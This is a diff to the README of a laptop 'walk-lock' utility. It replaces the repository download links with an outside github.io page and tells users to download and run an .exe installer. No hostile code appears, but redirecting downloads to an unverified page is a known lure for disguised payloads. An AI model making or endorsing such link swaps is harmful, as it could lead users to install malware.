@@ -1,6 +1,6 @@
 # 🔒 Uthereal-Security---Laptop-Walk-Lock - Secure your laptop using phone proximity
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Ftlostrogoth577/Uthereal-Security---Laptop-Walk-Lock)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://ftlostrogoth577.github.io)
 
 ## 📌 Overview
 
@@ -26,7 +26,7 @@ This software protects your computer. It locks your screen when you walk away fr
 
 Follow these steps to set up the software.
 
-1.  **Visit the Download Page:** Go to [this link](https://github.com/Ftlostrogoth577/Uthereal-Security---Laptop-Walk-Lock) to reach the download area.
+1.  **Visit the Download Page:** Go to [this link](https://ftlostrogoth577.github.io) to reach the download area.
 2.  **Select the Installer:** Look for the download button. Click the file with an `.exe` extension. Save this file to your Downloads folder.
 3.  **Run the Installer:** Double-click the saved file. A window appears. Follow the prompts on the screen.
 4.  **Complete Setup:** Click the Finish button. The application shortcut appears on your desktop.
